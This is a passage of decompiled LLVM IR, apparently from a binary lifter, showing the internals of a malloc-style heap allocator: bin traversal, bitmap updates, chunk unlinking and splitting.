  br i1 %v1_80506d217, label %dec_label_pc_80505f5.lr.ph, label %dec_label_pc_80506d8

dec_label_pc_80505f5.lr.ph:                       ; preds = %dec_label_pc_80506c6.preheader
  %v1_805061c = add i32 %v1_80508d8, 16
  br label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505f5.lr.ph, %dec_label_pc_80506c6
  %v1_8050bef = phi i32 [ %v0_80506c69, %dec_label_pc_80505f5.lr.ph ], [ %v0_80506c6, %dec_label_pc_80506c6 ]
  %v1_80505f5 = add i32 %v1_8050bef, 4
  %v2_80505f5 = inttoptr i32 %v1_80505f5 to i32*
  %v3_80505f5 = load i32, i32* %v2_80505f5, align 4
  %v1_80505f8 = add i32 %v1_8050bef, 12
  %v2_80505f8 = inttoptr i32 %v1_80505f8 to i32*
  %v3_80505f8 = load i32, i32* %v2_80505f8, align 4
  store i32 %v3_80505f8, i32* @edx, align 4
  %v1_80505fb = and i32 %v3_80505f5, -4
  store i32 %v1_80505fb, i32* @edi, align 4
  br i1 %v6_8050591, label %dec_label_pc_8050627, label %dec_label_pc_8050608

dec_label_pc_8050608:                             ; preds = %dec_label_pc_80505f5
  %v9_8050608 = icmp eq i32 %v3_80505f8, 134558580
  %v1_805060e = icmp eq i1 %v9_8050608, false
  br i1 %v1_805060e, label %dec_label_pc_8050627, label %dec_label_pc_8050610

dec_label_pc_8050610:                             ; preds = %dec_label_pc_8050608
  %v1_8050610 = load i32, i32* @global_var_8053370.190, align 16
  %v12_8050610 = icmp eq i32 %v1_8050bef, %v1_8050610
  %v1_8050616 = icmp eq i1 %v12_8050610, false
  br i1 %v1_8050616, label %dec_label_pc_8050627, label %dec_label_pc_8050618

dec_label_pc_8050618:                             ; preds = %dec_label_pc_8050610
  store i32 %v1_805061c, i32* %eax.global-to-local, align 4
  %v6_8050621 = icmp ugt i32 %v1_80505fb, %v1_805061c
  br i1 %v6_8050621, label %dec_label_pc_8050bd8, label %dec_label_pc_8050627

dec_label_pc_8050627:                             ; preds = %dec_label_pc_8050618, %dec_label_pc_8050610, %dec_label_pc_8050608, %dec_label_pc_80505f5
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %eax.global-to-local, align 4
  %v2_805062c = add i32 %v3_80505f8, 8
  %v3_805062c = inttoptr i32 %v2_805062c to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v3_805062c, align 4
  %v0_805062f = load i32, i32* @edx, align 4
  store i32 %v0_805062f, i32* @global_var_8053380.192, align 4
  %v0_8050632 = load i32, i32* @edi, align 4
  %v15_8050632 = icmp eq i32 %v0_8050632, %v1_80508d8
  br i1 %v15_8050632, label %dec_label_pc_8050c19, label %dec_label_pc_805063c

dec_label_pc_805063c:                             ; preds = %dec_label_pc_8050627
  %v6_8050642 = icmp ugt i32 %v0_8050632, 255
  br i1 %v6_8050642, label %dec_label_pc_8050655, label %dec_label_pc_8050644

dec_label_pc_8050644:                             ; preds = %dec_label_pc_805063c
  %v2_8050646 = udiv i32 %v0_8050632, 8
  store i32 %v2_8050646, i32* %esi.global-to-local, align 4
  %v1_8050649 = mul nuw i32 %v2_8050646, 8
  %v2_8050649 = add i32 %v1_8050649, 134558572
  store i32 %v2_8050649, i32* @ebx, align 4
  %v1_8050650 = add i32 %v1_8050649, 134558580
  %v2_8050650 = inttoptr i32 %v1_8050650 to i32*
  %v3_8050650 = load i32, i32* %v2_8050650, align 4
  store i32 %v3_8050650, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805069e

dec_label_pc_8050655:                             ; preds = %dec_label_pc_805063c
  store i32 %v0_8050632, i32* @eax, align 4
  %v0_8050657 = call i32 @function_80504be()
  store i32 %v0_8050657, i32* %esi.global-to-local, align 4
  %v1_805065e = mul i32 %v0_8050657, 8
  %v2_805065e = add i32 %v1_805065e, ptrtoint (i32* @global_var_805336c.189 to i32)
  store i32 %v2_805065e, i32* %eax.global-to-local, align 4
  %v1_8050665 = add i32 %v1_805065e, add (i32 ptrtoint (i32* @global_var_805336c.189 to i32), i32 8)
  %v2_8050665 = inttoptr i32 %v1_8050665 to i32*
  %v3_8050665 = load i32, i32* %v2_8050665, align 4
  store i32 %v3_8050665, i32* %edx.global-to-local, align 4
  store i32 %v3_8050665, i32* @ebx, align 4
  %v12_805066e = icmp eq i32 %v3_8050665, %v2_805065e
  br i1 %v12_805066e, label %dec_label_pc_805069e, label %dec_label_pc_8050672

dec_label_pc_8050672:                             ; preds = %dec_label_pc_8050655
  %v1_8050672 = add i32 %v1_805065e, add (i32 ptrtoint (i32* @global_var_805336c.189 to i32), i32 12)
  %v2_8050672 = inttoptr i32 %v1_8050672 to i32*
  %v3_8050672 = load i32, i32* %v2_8050672, align 4
  store i32 %v3_8050672, i32* @ebx, align 4
  %v0_8050675 = load i32, i32* @edi, align 4
  %v2_8050675 = add i32 %v3_8050672, 4
  %v3_8050675 = inttoptr i32 %v2_8050675 to i32*
  %v4_8050675 = load i32, i32* %v3_8050675, align 4
  %v10_8050675 = icmp ult i32 %v0_8050675, %v4_8050675
  %v1_8050678 = icmp eq i1 %v10_8050675, false
  br i1 %v1_8050678, label %dec_label_pc_8050680, label %dec_label_pc_805069e

dec_label_pc_8050680:                             ; preds = %dec_label_pc_8050672
  %v1_8050682 = or i32 %v0_8050675, 1
  store i32 %v1_8050682, i32* %eax.global-to-local, align 4
  store i32 %v3_8050665, i32* %ebx.global-to-local, align 4
  %v2_8050696105 = add i32 %v3_8050665, 4
  %v3_8050696106 = inttoptr i32 %v2_8050696105 to i32*
  %v4_8050696107 = load i32, i32* %v3_8050696106, align 4
  %v10_8050696108 = icmp ult i32 %v1_8050682, %v4_8050696107
  br i1 %v10_8050696108, label %dec_label_pc_8050687, label %dec_label_pc_805069b

dec_label_pc_8050687:                             ; preds = %dec_label_pc_8050680, %dec_label_pc_8050687
  %v0_805069b109 = phi i32 [ %v3_805068b, %dec_label_pc_8050687 ], [ %v3_8050665, %dec_label_pc_8050680 ]
  store i32 %v0_805069b109, i32* %ecx.global-to-local, align 4
  %v1_805068b = add i32 %v0_805069b109, 8
  %v2_805068b = inttoptr i32 %v1_805068b to i32*
  %v3_805068b = load i32, i32* %v2_805068b, align 4
  store i32 %v3_805068b, i32* %ecx.global-to-local, align 4
  store i32 %v3_805068b, i32* %ebx.global-to-local, align 4
  %v2_8050696 = add i32 %v3_805068b, 4
  %v3_8050696 = inttoptr i32 %v2_8050696 to i32*
  %v4_8050696 = load i32, i32* %v3_8050696, align 4
  %v10_8050696 = icmp ult i32 %v1_8050682, %v4_8050696
  br i1 %v10_8050696, label %dec_label_pc_8050687, label %dec_label_pc_805069b

dec_label_pc_805069b:                             ; preds = %dec_label_pc_8050687, %dec_label_pc_8050680
  %v0_805069b.lcssa = phi i32 [ %v3_8050665, %dec_label_pc_8050680 ], [ %v3_805068b, %dec_label_pc_8050687 ]
  %v1_805069b = add i32 %v0_805069b.lcssa, 12
  %v2_805069b = inttoptr i32 %v1_805069b to i32*
  %v3_805069b = load i32, i32* %v2_805069b, align 4
  store i32 %v3_805069b, i32* @ebx, align 4
  br label %dec_label_pc_805069e

dec_label_pc_805069e:                             ; preds = %dec_label_pc_8050644, %dec_label_pc_8050672, %dec_label_pc_8050655, %dec_label_pc_805069b
  %v0_805069e = phi i32 [ %v0_8050657, %dec_label_pc_8050655 ], [ %v0_8050657, %dec_label_pc_805069b ], [ %v0_8050657, %dec_label_pc_8050672 ], [ %v2_8050646, %dec_label_pc_8050644 ]
  %stack_var_-64.1 = phi i32 [ %v2_805065e, %dec_label_pc_8050655 ], [ %v0_805069b.lcssa, %dec_label_pc_805069b ], [ %v2_805065e, %dec_label_pc_8050672 ], [ %v3_8050650, %dec_label_pc_8050644 ]
  %v1_80506a0 = urem i32 %v0_805069e, 32
  %v2_80506a0 = icmp eq i32 %v1_80506a0, 0
  store i32 %v1_80506a0, i32* %esi.global-to-local, align 4
  store i32 %v1_80506a0, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80506aa = sdiv i32 %v0_805069e, 32
  store i32 %v2_80506aa, i32* %edx.global-to-local, align 4
  br i1 %v2_80506a0, label %dec_label_pc_80506c6, label %bb

bb:                                               ; preds = %dec_label_pc_805069e
  %v5_80506ad = shl i32 1, %v1_80506a0
  store i32 %v5_80506ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506c6

dec_label_pc_80506c6:                             ; preds = %dec_label_pc_805069e, %bb
  %v5_80506af = phi i32 [ 1, %dec_label_pc_805069e ], [ %v5_80506ad, %bb ]
  %v1_80506af = mul nsw i32 %v2_80506aa, 4
  %v2_80506af = add i32 %v1_80506af, ptrtoint (i32* @global_var_8053674.193 to i32)
  %v3_80506af = inttoptr i32 %v2_80506af to i32*
  %v4_80506af = load i32, i32* %v3_80506af, align 4
  %v6_80506af = or i32 %v4_80506af, %v5_80506af
  store i32 %v6_80506af, i32* %v3_80506af, align 4
  %v0_80506b6 = load i32, i32* @ebx, align 4
  %v1_80506b6 = load i32, i32* @ebp, align 4
  %v2_80506b6 = add i32 %v1_80506b6, 12
  %v3_80506b6 = inttoptr i32 %v2_80506b6 to i32*
  store i32 %v0_80506b6, i32* %v3_80506b6, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80506bd = load i32, i32* @ebp, align 4
  %v2_80506bd = add i32 %v1_80506bd, 8
  %v3_80506bd = inttoptr i32 %v2_80506bd to i32*
  store i32 %stack_var_-64.1, i32* %v3_80506bd, align 4
  %v0_80506c0 = load i32, i32* @ebp, align 4
  %v1_80506c0 = load i32, i32* @ebx, align 4
  %v2_80506c0 = add i32 %v1_80506c0, 8
  %v3_80506c0 = inttoptr i32 %v2_80506c0 to i32*
  store i32 %v0_80506c0, i32* %v3_80506c0, align 4
  %v0_80506c3 = load i32, i32* @ebp, align 4
  %v1_80506c3 = load i32, i32* @esi, align 4
  %v2_80506c3 = add i32 %v1_80506c3, 12
  %v3_80506c3 = inttoptr i32 %v2_80506c3 to i32*
  store i32 %v0_80506c3, i32* %v3_80506c3, align 4
  %v0_80506c6 = load i32, i32* @global_var_8053380.192, align 128
  store i32 %v0_80506c6, i32* @ebp, align 4
  %v9_80506cc = icmp eq i32 %v0_80506c6, 134558580
  %v1_80506d2 = icmp eq i1 %v9_80506cc, false
  br i1 %v1_80506d2, label %dec_label_pc_80505f5, label %dec_label_pc_80506d8

dec_label_pc_80506d8:                             ; preds = %dec_label_pc_80506c6, %dec_label_pc_80506c6.preheader
  br i1 %v8_8050589, label %dec_label_pc_8050766, label %dec_label_pc_80506e6

dec_label_pc_80506e6:                             ; preds = %dec_label_pc_80506d8
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80506ea = mul i32 %stack_var_-40.0.ph, 8
  %v2_80506ea = add i32 %v1_80506ea, ptrtoint (i32* @global_var_805336c.189 to i32)
  store i32 %v2_80506ea, i32* %edx.global-to-local, align 4
  %v1_80506f1 = add i32 %v1_80506ea, add (i32 ptrtoint (i32* @global_var_805336c.189 to i32), i32 12)
  %v2_80506f1 = inttoptr i32 %v1_80506f1 to i32*
  %storemerge1.pre = load i32, i32* %v2_80506f1, align 4
  br label %dec_label_pc_8050762

dec_label_pc_80506f6:                             ; preds = %dec_label_pc_8050762
  %v1_80506f6 = add i32 %v4_805070d, 4
  %v2_80506f6 = inttoptr i32 %v1_80506f6 to i32*
  %v3_80506f6 = load i32, i32* %v2_80506f6, align 4
  store i32 %v3_80506f6, i32* %ebx.global-to-local, align 4
  %v1_80506f9 = add i32 %v4_805070d, 12
  %v2_80506f9 = inttoptr i32 %v1_80506f9 to i32*
  %v3_80506f9 = load i32, i32* %v2_80506f9, align 4
  store i32 %v3_80506f9, i32* @ecx, align 4
  %v1_80506fc = and i32 %v3_80506f6, -4
  store i32 %v1_80506fc, i32* @ebx, align 4
  %v10_80506ff = icmp ult i32 %v1_80506fc, %v1_80508d8
  br i1 %v10_80506ff, label %dec_label_pc_8050762, label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506f6
  %v1_8050705 = add i32 %v4_805070d, 8
  %v2_8050705 = inttoptr i32 %v1_8050705 to i32*
  %v3_8050705 = load i32, i32* %v2_8050705, align 4
  store i32 %v3_8050705, i32* @edx, align 4
  %v1_8050708 = add i32 %v3_8050705, 12
  %v2_8050708 = inttoptr i32 %v1_8050708 to i32*
  %v3_8050708 = load i32, i32* %v2_8050708, align 4
  %v15_8050708 = icmp eq i32 %v3_8050708, %v4_805070d
  %v1_805070b = icmp eq i1 %v15_8050708, false
  br i1 %v1_805070b, label %dec_label_pc_8050712, label %dec_label_pc_805070d

dec_label_pc_805070d:                             ; preds = %dec_label_pc_8050705
  %v1_805070d = add i32 %v3_80506f9, 8
  %v2_805070d = inttoptr i32 %v1_805070d to i32*
  %v3_805070d = load i32, i32* %v2_805070d, align 4
  %v15_805070d = icmp eq i32 %v3_805070d, %v4_805070d
  br i1 %v15_805070d, label %dec_label_pc_8050717, label %dec_label_pc_8050712

dec_label_pc_8050712:                             ; preds = %dec_label_pc_805070d, %dec_label_pc_8050705
  %v0_8050712 = call i32 @function_8051445()
  store i32 %v0_8050712, i32* %eax.global-to-local, align 4
  %v0_8050717.pre = load i32, i32* @ebx, align 4
  %v0_805071d.pre = load i32, i32* @ecx, align 4
  %v1_805071d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050717

dec_label_pc_8050717:                             ; preds = %dec_label_pc_805070d, %dec_label_pc_8050712
  %v1_805071d = phi i32 [ %v3_8050705, %dec_label_pc_805070d ], [ %v1_805071d.pre, %dec_label_pc_8050712 ]
  %v0_805071d = phi i32 [ %v3_80506f9, %dec_label_pc_805070d ], [ %v0_805071d.pre, %dec_label_pc_8050712 ]
  %v0_8050717 = phi i32 [ %v1_80506fc, %dec_label_pc_805070d ], [ %v0_8050717.pre, %dec_label_pc_8050712 ]
  %v5_8050719 = sub i32 %v0_8050717, %v1_80508d8
  store i32 %v5_8050719, i32* %esi.global-to-local, align 4
  %v2_805071d = add i32 %v1_805071d, 12
  %v3_805071d = inttoptr i32 %v2_805071d to i32*
  store i32 %v0_805071d, i32* %v3_805071d, align 4
  %v0_8050720 = load i32, i32* @edx, align 4
  %v1_8050720 = load i32, i32* @ecx, align 4
  %v2_8050720 = add i32 %v1_8050720, 8
  %v3_8050720 = inttoptr i32 %v2_8050720 to i32*
  store i32 %v0_8050720, i32* %v3_8050720, align 4
  %v0_8050723 = load i32, i32* %esi.global-to-local, align 4
  %v0_8050726 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050726 = add i32 %v0_8050726, 8
  store i32 %v1_8050726, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8050723, 16
  br i1 %tmp126, label %dec_label_pc_8050c27, label %dec_label_pc_805072f

dec_label_pc_805072f:                             ; preds = %dec_label_pc_8050717
  %v2_8050733 = add i32 %v0_8050726, %v1_80508d8
  store i32 %v2_8050733, i32* @edx, align 4
  %v1_8050736 = or i32 %v1_80508d8, 1
  store i32 %v1_8050736, i32* %ebx.global-to-local, align 4
  %v2_8050739 = add i32 %v0_8050726, 4
  %v3_8050739 = inttoptr i32 %v2_8050739 to i32*
  store i32 %v1_8050736, i32* %v3_8050739, align 4
  %v0_805073c = load i32, i32* %esi.global-to-local, align 4
  %v1_805073e = or i32 %v0_805073c, 1
  store i32 %v1_805073e, i32* %eax.global-to-local, align 4
  %v0_8050741 = load i32, i32* @edx, align 4
  %v1_8050741 = load i32, i32* @ebp, align 4
  %v2_8050741 = add i32 %v1_8050741, 8
  %v3_8050741 = inttoptr i32 %v2_8050741 to i32*
  store i32 %v0_8050741, i32* %v3_8050741, align 4
  %v0_8050744 = load i32, i32* @edx, align 4
  %v1_8050744 = load i32, i32* @ebp, align 4
  %v2_8050744 = add i32 %v1_8050744, 12
  %v3_8050744 = inttoptr i32 %v2_8050744 to i32*
  store i32 %v0_8050744, i32* %v3_8050744, align 4
  %v0_8050747 = load i32, i32* @edx, align 4
  %v1_8050747 = add i32 %v0_8050747, 8
  %v2_8050747 = inttoptr i32 %v1_8050747 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_8050747, align 4
  %v0_805074e = load i32, i32* @edx, align 4
  %v1_805074e = add i32 %v0_805074e, 12
  %v2_805074e = inttoptr i32 %v1_805074e to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_805074e, align 4
  %v0_8050755 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050755 = load i32, i32* @edx, align 4
  %v2_8050755 = add i32 %v1_8050755, 4
  %v3_8050755 = inttoptr i32 %v2_8050755 to i32*
  store i32 %v0_8050755, i32* %v3_8050755, align 4
  %v0_8050758 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050758 = load i32, i32* @edx, align 4
  %v3_8050758 = add i32 %v1_8050758, %v0_8050758
  %v4_8050758 = inttoptr i32 %v3_8050758 to i32*
  store i32 %v0_8050758, i32* %v4_8050758, align 4
  br label %dec_label_pc_8050c2c

dec_label_pc_8050762:                             ; preds = %dec_label_pc_80506f6, %dec_label_pc_80506e6
  %v4_805070d = phi i32 [ %storemerge1.pre, %dec_label_pc_80506e6 ], [ %v3_80506f9, %dec_label_pc_80506f6 ]
  store i32 %v4_805070d, i32* %eax.global-to-local, align 4
  %v12_8050762 = icmp eq i32 %v4_805070d, %v2_80506ea
  %v1_8050764 = icmp eq i1 %v12_8050762, false
  br i1 %v1_8050764, label %dec_label_pc_80506f6, label %dec_label_pc_8050766.loopexit

dec_label_pc_8050766.loopexit:                    ; preds = %dec_label_pc_8050762
  br label %dec_label_pc_8050766

dec_label_pc_8050766:                             ; preds = %dec_label_pc_8050766.loopexit, %dec_label_pc_80506d8
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805076f = add i32 %stack_var_-40.0.ph, 1
  %v2_8050772 = udiv i32 %v1_805076f, 32
  store i32 %v2_8050772, i32* @edi, align 4
  %v1_8050775 = mul i32 %v1_805076f, 8
  %v2_8050775 = add i32 %v1_8050775, ptrtoint (i32* @global_var_805336c.189 to i32)
  store i32 %v2_8050775, i32* %ebx.global-to-local, align 4
  %v1_805077c = urem i32 %v1_805076f, 32
  %v2_805077c = icmp eq i32 %v1_805077c, 0
  store i32 %v1_805077c, i32* %ecx.global-to-local, align 4
  %v1_805077f = mul nuw nsw i32 %v2_8050772, 4
  %v2_805077f = add i32 %v1_805077f, ptrtoint (i32* @global_var_8053674.193 to i32)
  %v3_805077f = inttoptr i32 %v2_805077f to i32*
  %v4_805077f = load i32, i32* %v3_805077f, align 4
  store i32 %v4_805077f, i32* %edx.global-to-local, align 4
  br i1 %v2_805077c, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8050766
  %v5_8050786 = shl i32 1, %v1_805077c
  store i32 %v5_8050786, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8050766, %bb88, %dec_label_pc_80507c7
  %v1_8050788 = phi i32 [ %v1_8050788.pre, %dec_label_pc_80507c7 ], [ %v4_805077f, %bb88 ], [ %v4_805077f, %dec_label_pc_8050766 ]
  %v0_805078c = phi i32 [ %v0_8050788.pre, %dec_label_pc_80507c7 ], [ %v5_8050786, %bb88 ], [ 1, %dec_label_pc_8050766 ]
  %tmp89 = icmp ule i32 %v0_805078c, %v1_8050788
  %v1_805078c = icmp eq i32 %v0_805078c, 0
  %v1_805078e = icmp eq i1 %v1_805078c, false
  %or.cond = and i1 %tmp89, %v1_805078e
  br i1 %or.cond, label %dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge, label %dec_label_pc_8050790.preheader

dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge: ; preds = %.preheader
  %v0_80507b77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507bc.preheader

dec_label_pc_8050790.preheader:                   ; preds = %.preheader
  %v0_8050790.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050790

dec_label_pc_8050790:                             ; preds = %dec_label_pc_8050790.preheader, %dec_label_pc_805079a
  %v0_8050790 = phi i32 [ %v0_8050790.pre, %dec_label_pc_8050790.preheader ], [ %v1_8050790, %dec_label_pc_805079a ]
  %v1_8050790 = add i32 %v0_8050790, 1
  store i32 %v1_8050790, i32* @edi, align 4
  %v6_8050794 = icmp ugt i32 %v1_8050790, 2
  br i1 %v6_8050794, label %dec_label_pc_8050843.loopexit, label %dec_label_pc_805079a

dec_label_pc_805079a:                             ; preds = %dec_label_pc_8050790
  %v1_805079a = mul i32 %v1_8050790, 4
  %v2_805079a = add i32 %v1_805079a, ptrtoint (i32* @global_var_8053674.193 to i32)
  %v3_805079a = inttoptr i32 %v2_805079a to i32*
  %v4_805079a = load i32, i32* %v3_805079a, align 4
  store i32 %v4_805079a, i32* %edx.global-to-local, align 4
  %v1_80507a1 = icmp eq i32 %v4_805079a, 0
  br i1 %v1_80507a1, label %dec_label_pc_8050790, label %dec_label_pc_80507a5

dec_label_pc_80507a5:                             ; preds = %dec_label_pc_805079a
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80507ac = mul i32 %v1_8050790, 256
  store i32 %v2_80507ac, i32* %eax.global-to-local, align 4
  %v1_80507af = add i32 %v2_80507ac, ptrtoint (i32* @global_var_805336c.189 to i32)
  store i32 %v1_80507af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507bc.preheader

dec_label_pc_80507bc.preheader:                   ; preds = %dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge, %dec_label_pc_80507a5
  %v0_80507b77 = phi i32 [ %v1_80507af, %dec_label_pc_80507a5 ], [ %v0_80507b77.pre, %dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80507a5 ], [ %v0_805078c, %dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge ]
  %v0_80507ce = phi i32 [ %v4_805079a, %dec_label_pc_80507a5 ], [ %v1_8050788, %dec_label_pc_805078c.dec_label_pc_80507bc.preheader_crit_edge ]
  %v2_80507bc4 = and i32 %v0_80507ce, %esi.promoted
  %v3_80507bc5 = icmp eq i32 %v2_80507bc4, 0
  br i1 %v3_80507bc5, label %dec_label_pc_80507b7, label %dec_label_pc_80507c0

dec_label_pc_80507b7:                             ; preds = %dec_label_pc_80507bc.preheader, %dec_label_pc_80507b7
  %v2_80507ba18 = phi i32 [ %v2_80507ba, %dec_label_pc_80507b7 ], [ %esi.promoted, %dec_label_pc_80507bc.preheader ]
  %v0_80507b78 = phi i32 [ %v1_80507b7, %dec_label_pc_80507b7 ], [ %v0_80507b77, %dec_label_pc_80507bc.preheader ]
  %v1_80507b7 = add i32 %v0_80507b78, 8
  %v2_80507ba = mul i32 %v2_80507ba18, 2
  %v2_80507bc = and i32 %v2_80507ba, %v0_80507ce
  %v3_80507bc = icmp eq i32 %v2_80507bc, 0
  br i1 %v3_80507bc, label %dec_label_pc_80507b7, label %dec_label_pc_80507bc.dec_label_pc_80507c0_crit_edge

dec_label_pc_80507bc.dec_label_pc_80507c0_crit_edge: ; preds = %dec_label_pc_80507b7
  store i32 %v1_80507b7, i32* %ebx.global-to-local, align 4
  store i32 %v2_80507ba, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80507c0

dec_label_pc_80507c0:                             ; preds = %dec_label_pc_80507bc.dec_label_pc_80507c0_crit_edge, %dec_label_pc_80507bc.preheader
  %v0_80507d0 = phi i32 [ %v2_80507ba, %dec_label_pc_80507bc.dec_label_pc_80507c0_crit_edge ], [ %esi.promoted, %dec_label_pc_80507bc.preheader ]
  %v1_80507ea = phi i32 [ %v1_80507b7, %dec_label_pc_80507bc.dec_label_pc_80507c0_crit_edge ], [ %v0_80507b77, %dec_label_pc_80507bc.preheader ]
  %v1_80507c0 = add i32 %v1_80507ea, 12
  %v2_80507c0 = inttoptr i32 %v1_80507c0 to i32*
  %v3_80507c0 = load i32, i32* %v2_80507c0, align 4
  store i32 %v3_80507c0, i32* %ecx.global-to-local, align 4
  %v12_80507c3 = icmp eq i32 %v3_80507c0, %v1_80507ea
  %v1_80507c5 = icmp eq i1 %v12_80507c3, false
  br i1 %v1_80507c5, label %dec_label_pc_80507db, label %dec_label_pc_80507c7

dec_label_pc_80507c7:                             ; preds = %dec_label_pc_80507c0
  %v1_80507c9 = add i32 %v3_80507c0, 8
  store i32 %v1_80507c9, i32* %ebx.global-to-local, align 4
  %v1_80507cc = sub i32 -1, %v0_80507d0
  store i32 %v1_80507cc, i32* %eax.global-to-local, align 4
  %v2_80507ce = and i32 %v0_80507ce, %v1_80507cc
  store i32 %v2_80507ce, i32* %edx.global-to-local, align 4
  %v2_80507d0 = mul i32 %v0_80507d0, 2
  store i32 %v2_80507d0, i32* %esi.global-to-local, align 4
  %v1_80507d2 = load i32, i32* @edi, align 4
  %v2_80507d2 = mul i32 %v1_80507d2, 4
  %v3_80507d2 = add i32 %v2_80507d2, ptrtoint (i32* @global_var_8053674.193 to i32)
  %v4_80507d2 = inttoptr i32 %v3_80507d2 to i32*
  store i32 %v2_80507ce, i32* %v4_80507d2, align 4
  %v0_8050788.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050788.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_80507db:                             ; preds = %dec_label_pc_80507c0
  %v1_80507db = add i32 %v3_80507c0, 4
  %v2_80507db = inttoptr i32 %v1_80507db to i32*
  %v3_80507db = load i32, i32* %v2_80507db, align 4
  store i32 %v3_80507db, i32* %edx.global-to-local, align 4
  %v1_80507de = add i32 %v3_80507c0, 12
  %v2_80507de = inttoptr i32 %v1_80507de to i32*
  %v3_80507de = load i32, i32* %v2_80507de, align 4
  store i32 %v3_80507de, i32* %eax.global-to-local, align 4
  %v1_80507e1 = and i32 %v3_80507db, -4
  store i32 %v1_80507e1, i32* @edx, align 4
  %v5_80507e6 = sub i32 %v1_80507e1, %v1_80508d8
  store i32 %v5_80507e6, i32* %esi.global-to-local, align 4
  store i32 %v3_80507de, i32* %v2_80507c0, align 4
  %v0_80507ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507ed = load i32, i32* %eax.global-to-local, align 4
  %v2_80507ed = add i32 %v1_80507ed, 8
  %v3_80507ed = inttoptr i32 %v2_80507ed to i32*
  store i32 %v0_80507ed, i32* %v3_80507ed, align 4
  %v0_80507f0 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_80507f0, 16
  br i1 %tmp127, label %dec_label_pc_80507f5, label %dec_label_pc_80507fc

dec_label_pc_80507f5:                             ; preds = %dec_label_pc_80507db
  %v0_80507f5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80507f5 = load i32, i32* @edx, align 4
  %v2_80507f5 = add i32 %v0_80507f5, 4
  %v3_80507f5 = add i32 %v2_80507f5, %v1_80507f5
  %v4_80507f5 = inttoptr i32 %v3_80507f5 to i32*
  %v5_80507f5 = load i32, i32* %v4_80507f5, align 4
  %v6_80507f5 = or i32 %v5_80507f5, 1
  store i32 %v6_80507f5, i32* %v4_80507f5, align 4
  br label %dec_label_pc_805083b

dec_label_pc_80507fc:                             ; preds = %dec_label_pc_80507db
  store i32 %v1_80508d8, i32* %eax.global-to-local, align 4
  %v0_8050805 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050805 = add i32 %v0_8050805, %v1_80508d8
  store i32 %v2_8050805, i32* @edx, align 4
  %v1_8050808 = load i32, i32* @ebp, align 4
  %v2_8050808 = add i32 %v1_8050808, 8
  %v3_8050808 = inttoptr i32 %v2_8050808 to i32*
  store i32 %v2_8050805, i32* %v3_8050808, align 4
  %v0_805080b = load i32, i32* @edx, align 4
  %v1_805080b = load i32, i32* @ebp, align 4
  %v2_805080b = add i32 %v1_805080b, 12
  %v3_805080b = inttoptr i32 %v2_805080b to i32*
  store i32 %v0_805080b, i32* %v3_805080b, align 4
  %v0_805080e = load i32, i32* @edx, align 4
  %v1_805080e = add i32 %v0_805080e, 8
  %v2_805080e = inttoptr i32 %v1_805080e to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_805080e, align 4
  %v0_8050815 = load i32, i32* @edx, align 4
  %v1_8050815 = add i32 %v0_8050815, 12
  %v2_8050815 = inttoptr i32 %v1_8050815 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_8050815, align 4
  br i1 %v6_8050591, label %dec_label_pc_8050824, label %dec_label_pc_805081e

dec_label_pc_805081e:                             ; preds = %dec_label_pc_80507fc
  %v0_805081e = load i32, i32* @edx, align 4
  store i32 %v0_805081e, i32* @global_var_8053370.190, align 16
  br label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_80507fc, %dec_label_pc_805081e
  %v4_8050824 = or i32 %v1_80508d8, 1
  %v0_8050829 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050824, i32* %ebx.global-to-local, align 4
  %v1_805082f = or i32 %v0_8050829, 1
  store i32 %v1_805082f, i32* %eax.global-to-local, align 4
  %v1_8050832 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050832 = add i32 %v1_8050832, 4
  %v3_8050832 = inttoptr i32 %v2_8050832 to i32*
  store i32 %v4_8050824, i32* %v3_8050832, align 4
  %v0_8050835 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050835 = load i32, i32* @edx, align 4
  %v3_8050835 = add i32 %v1_8050835, %v0_8050835
  %v4_8050835 = inttoptr i32 %v3_8050835 to i32*
